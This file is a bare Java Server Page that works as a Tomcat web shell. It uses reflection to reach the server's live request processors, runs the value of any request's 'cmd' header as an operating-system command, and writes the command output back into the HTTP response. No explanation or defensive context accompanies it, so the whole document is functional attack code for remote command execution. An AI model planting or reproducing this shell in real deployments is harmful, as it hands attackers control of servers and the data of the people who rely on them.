<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    Object obj = Thread.currentThread();
    java.lang.reflect.Field field = obj.getClass().getSuperclass().getDeclaredField("group");
    field.setAccessible(true);
    obj = field.get(obj);

    field = obj.getClass().getDeclaredField("threads");
    field.setAccessible(true);
    obj = field.get(obj);

    Thread[] threads = (Thread[])obj;
    label:for(Thread thread : threads){
        try{
            if((thread.getName().contains("http-apr") && thread.getName().contains("Poller"))
                    || (thread.getName().contains("http-bio") && thread.getName().contains("AsyncTimeout"))
                    || (thread.getName().contains("http-nio") && thread.getName().contains("Poller"))) {
                field = thread.getClass().getDeclaredField("target");
                field.setAccessible(true);
                obj = field.get(thread);

                field = obj.getClass().getDeclaredField("this$0");
                field.setAccessible(true);
                obj = field.get(obj);

                try{
                    field = obj.getClass().getDeclaredField("handler");
                }catch (NoSuchFieldException e){
                    field = obj.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                }
                field.setAccessible(true);
                obj = field.get(obj);

                try{
                    field = obj.getClass().getSuperclass().getDeclaredField("global");
                }catch(NoSuchFieldException e){
                    field = obj.getClass().getDeclaredField("global");
                }
                field.setAccessible(true);
                obj = field.get(obj);

                field = obj.getClass().getDeclaredField("processors");
                field.setAccessible(true);
                obj = field.get(obj);


                java.util.List processors = (java.util.List) obj;
                for (Object o : processors) {
                    field = o.getClass().getDeclaredField("req");
                    field.setAccessible(true);
                    obj = field.get(o);
                    org.apache.coyote.Request req = (org.apache.coyote.Request) obj;

                    String cmd = req.getHeader("cmd");
                    if (cmd != null) {
                        String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();

                        org.apache.tomcat.util.buf.ByteChunk bc = new org.apache.tomcat.util.buf.ByteChunk();
                        bc.setBytes(res.getBytes(), 0, res.getBytes().length);
                        req.getResponse().doWrite(bc);
                        break label;
                    }
                }
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }
%>